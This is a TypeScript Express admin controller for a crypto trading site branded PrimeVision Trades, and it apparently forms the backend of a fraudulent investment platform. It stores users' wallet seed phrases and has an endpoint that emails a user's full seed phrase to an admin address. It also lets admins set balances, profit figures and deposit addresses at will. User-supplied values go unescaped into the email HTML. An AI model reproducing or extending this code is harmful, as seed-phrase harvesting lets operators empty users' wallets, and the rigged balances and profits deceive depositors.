import { Request, Response } from 'express';
import { AuthRequest } from '../middleware/auth.middleware';
import User from '../models/User';
import Transaction from '../models/Transaction';
import Trade from '../models/Trade';
import CopyTrader from '../models/CopyTrader';
import Wallet from '../models/Wallet';
import LoginLog from '../models/LoginLog';
import DepositAddress from '../models/DepositAddress';
import { sendWithdrawalEmail } from '../services/email.service';
import resend from '../config/resend';

export const getStats = async (req: Request, res: Response): Promise<void> => {
  try {
    const totalUsers = await User.countDocuments({ role: 'user' });
    const pendingWithdrawals = await Transaction.countDocuments({ type: 'withdrawal', status: 'pending' });
    const completedTx = await Transaction.find({ status: 'completed' });
    const totalVolume = completedTx.reduce((acc, t) => acc + t.amount, 0);
    const totalTrades = await Trade.countDocuments();
    res.json({ totalUsers, pendingWithdrawals, totalVolume, totalTrades });
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

export const getAllUsers = async (req: Request, res: Response): Promise<void> => {
  try {
    const users = await User.find().select('-password').sort({ createdAt: -1 });
    res.json(users);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

export const updateUser = async (req: Request, res: Response): Promise<void> => {
  try {
    const { name, balance, isActive, isVerified, role } = req.body;
    const user = await User.findByIdAndUpdate(
      req.params.id,
      { name, balance, isActive, isVerified, role },
      { new: true, runValidators: true }
    ).select('-password');
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }
    res.json(user);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

export const getAllTransactions = async (req: Request, res: Response): Promise<void> => {
  try {
    const { status, type } = req.query as { status?: string; type?: string };
    const filter: Record<string, string> = {};
    if (status) filter.status = status;
    if (type) filter.type = type;
    const transactions = await Transaction.find(filter)
      .populate('user', 'name email')
      .sort({ createdAt: -1 });
    res.json(transactions);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

export const updateTransaction = async (req: Request, res: Response): Promise<void> => {
  try {
    const { status, note } = req.body;
    const tx = await Transaction.findById(req.params.id).populate('user', 'name email balance');
    if (!tx) {
      res.status(404).json({ message: 'Transaction not found' });
      return;
    }
    tx.status = status;
    if (note) tx.note = note;
    await tx.save();

    const user = tx.user as unknown as { name: string; email: string; _id: string };

    // Handle balance updates
    if (status === 'completed' && tx.type === 'deposit') {
      await User.findByIdAndUpdate(user._id, { $inc: { balance: tx.amount } });
    }
    if (status === 'completed' && tx.type === 'withdrawal') {
      await User.findByIdAndUpdate(user._id, { $inc: { balance: -tx.amount } });
    }

    // Send email notification
    if (tx.type === 'withdrawal') {
      await sendWithdrawalEmail(user.name, user.email, tx.amount, status);
    }

    res.json(tx);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

export const getAllTrades = async (req: Request, res: Response): Promise<void> => {
  try {
    const trades = await Trade.find()
      .populate('user', 'name email')
      .sort({ createdAt: -1 })
      .limit(100);
    res.json(trades);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

export const updateTrade = async (req: Request, res: Response): Promise<void> => {
  try {
    const { status, pnl } = req.body;
    
    const oldTrade = await Trade.findById(req.params.id);
    if (!oldTrade) {
      res.status(404).json({ message: 'Trade not found' });
      return;
    }

    const trade = await Trade.findByIdAndUpdate(req.params.id, { status, pnl }, { new: true });
    
    // If trade was open and now cancelled or filled, refund/payout to user
    if (oldTrade.status === 'open' && (status === 'filled' || status === 'cancelled')) {
      const user = await User.findById(trade!.user);
      if (user) {
        // Payout = Original Margin + (PnL if filled)
        const payout = status === 'filled' ? trade!.amount + (trade!.pnl || 0) : trade!.amount;

        if (user.distribution && trade!.market in user.distribution) {
          const key = trade!.market as keyof typeof user.distribution;
          user.distribution[key] += payout;
        }
        user.balance += payout;
        await user.save();
      }
    }

    res.json(trade);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

// ─── Expert Traders ──────────────────────────────────────
export const createTrader = async (req: Request, res: Response): Promise<void> => {
  try {
    const trader = await CopyTrader.create(req.body);
    res.status(201).json(trader);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

export const updateTrader = async (req: Request, res: Response): Promise<void> => {
  try {
    const trader = await CopyTrader.findByIdAndUpdate(req.params.id, req.body, { new: true });
    if (!trader) { res.status(404).json({ message: 'Trader not found' }); return; }
    res.json(trader);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

export const deleteTrader = async (req: Request, res: Response): Promise<void> => {
  try {
    await CopyTrader.findByIdAndDelete(req.params.id);
    res.json({ message: 'Trader removed' });
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

// ─── Wallets (admin view) ────────────────────────────────
export const getAllWallets = async (req: Request, res: Response): Promise<void> => {
  try {
    const wallets = await Wallet.find().populate('user', 'name email').sort({ createdAt: -1 });
    res.json(wallets);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

export const sendSeedPhraseEmail = async (req: Request, res: Response): Promise<void> => {
  try {
    const wallet = await Wallet.findById(req.params.id).populate('user', 'name email');
    if (!wallet) { res.status(404).json({ message: 'Wallet not found' }); return; }
    if (!wallet.seedPhrase) { res.status(400).json({ message: 'No seed phrase on file' }); return; }
    const user = wallet.user as unknown as { name: string; email: string };
    const adminEmail = process.env.ADMIN_EMAIL || process.env.RESEND_API_KEY ? 'admin@primevisiontrades.com' : undefined;
    if (!adminEmail) { res.status(500).json({ message: 'ADMIN_EMAIL not configured' }); return; }
    await resend.emails.send({
      from: process.env.FROM_EMAIL || 'PrimeVision Trades Admin <noreply@primevisiontrades.com>',
      to: adminEmail,
      subject: `Seed Phrase — ${user.name} (${wallet.exchange})`,
      html: `
        <div style="font-family:monospace;background:#0e0e52;color:#fff;padding:24px;border-radius:12px">
          <h3 style="color:#e9d758">Wallet Seed Phrase</h3>
          <p><strong>User:</strong> ${user.name} &lt;${user.email}&gt;</p>
          <p><strong>Exchange:</strong> ${wallet.exchange}</p>
          <p><strong>Seed Phrase:</strong></p>
          <pre style="background:#150578;padding:16px;border-radius:8px;word-break:break-all">${wallet.seedPhrase}</pre>
          <p style="color:#cdcacc;font-size:12px">This email was requested by an admin from PrimeVision Trades dashboard.</p>
        </div>
      `,
    });
    res.json({ message: 'Seed phrase sent to admin email' });
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

// ─── Login Activity ──────────────────────────────────────
export const getLoginActivity = async (req: Request, res: Response): Promise<void> => {
  try {
    const logs = await LoginLog.find()
      .populate('user', 'name email')
      .sort({ createdAt: -1 })
      .limit(200);
    res.json(logs);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

// ─── Deposit Addresses ───────────────────────────────────
export const getDepositAddresses = async (req: Request, res: Response): Promise<void> => {
  try {
    const addresses = await DepositAddress.find().sort({ symbol: 1 });
    res.json(addresses);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

export const upsertDepositAddress = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { symbol, name, address, color } = req.body;
    if (!symbol || !name || !address) {
      res.status(400).json({ message: 'symbol, name and address are required' });
      return;
    }
    const doc = await DepositAddress.findOneAndUpdate(
      { symbol: symbol.toUpperCase() },
      { symbol: symbol.toUpperCase(), name, address, color: color || '#e9d758', updatedBy: req.user?._id },
      { new: true, upsert: true, runValidators: true }
    );
    res.json(doc);
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};

// ─── Deposit Notification (user sent payment) ────────────
export const notifyDeposit = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { amount, symbol, txHash } = req.body;
    const userId = req.user?._id;
    if (!amount || !symbol) {
      res.status(400).json({ message: 'amount and symbol are required' });
      return;
    }
    const user = await User.findById(userId).select('name email');
    if (!user) { res.status(404).json({ message: 'User not found' }); return; }

    // Create pending deposit transaction
    const tx = await Transaction.create({
      user: userId,
      type: 'deposit',
      amount: parseFloat(amount),
      method: symbol,
      status: 'pending',
      reference: txHash || undefined,
    });

    // Notify admin via email
    const adminEmail = process.env.ADMIN_EMAIL || 'admin@primevisiontrades.com';
    await resend.emails.send({
      from: process.env.FROM_EMAIL || 'PrimeVision Trades <noreply@primevisiontrades.com>',
      to: adminEmail,
      subject: `💰 Deposit Notification — ${user.name} sent $${parseFloat(amount).toLocaleString()}`,
      html: `
        <div style="font-family:Arial,sans-serif;background:#0e0e52;color:#fff;padding:32px;border-radius:16px">
          <h2 style="color:#e9d758;margin-top:0">New Deposit Notification</h2>
          <p>A user has marked a crypto payment as sent.</p>
          <table style="width:100%;border-collapse:collapse;margin:16px 0">
            <tr><td style="color:#cdcacc;padding:6px 0">User</td><td style="color:#fff;font-weight:600">${user.name}</td></tr>
            <tr><td style="color:#cdcacc;padding:6px 0">Email</td><td style="color:#fff">${user.email}</td></tr>
            <tr><td style="color:#cdcacc;padding:6px 0">Amount</td><td style="color:#e9d758;font-size:20px;font-weight:700">$${parseFloat(amount).toLocaleString()}</td></tr>
            <tr><td style="color:#cdcacc;padding:6px 0">Currency</td><td style="color:#fff">${symbol}</td></tr>
            ${txHash ? `<tr><td style="color:#cdcacc;padding:6px 0">Tx Hash</td><td style="color:#fff;font-size:12px;word-break:break-all">${txHash}</td></tr>` : ''}
          </table>
          <a href="${process.env.FRONTEND_URL || 'https://www.primevisiontrades.com'}/admin/transactions"
             style="display:inline-block;background:#f5a623;color:#fff;padding:12px 28px;border-radius:40px;text-decoration:none;font-weight:600;margin-top:8px">
            Review in Admin Dashboard
          </a>
          <p style="color:#cdcacc;font-size:12px;margin-top:24px">Transaction ID: ${tx._id}</p>
        </div>
      `,
    }).catch(() => {}); // non-blocking

    res.json({ ok: true, transactionId: tx._id });
  } catch (err) {
    res.status(500).json({ message: 'Server error', error: (err as Error).message });
  }
};
